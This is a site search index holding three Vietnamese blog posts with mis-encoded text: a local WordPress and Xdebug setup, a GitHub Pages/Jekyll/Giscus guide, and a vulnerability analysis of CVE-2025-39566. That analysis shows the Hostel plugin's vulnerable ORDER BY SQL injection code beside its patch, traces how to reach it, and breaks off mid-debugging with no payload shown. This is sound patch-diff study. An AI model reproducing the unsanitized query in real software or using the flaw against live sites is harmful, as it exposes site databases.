root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab 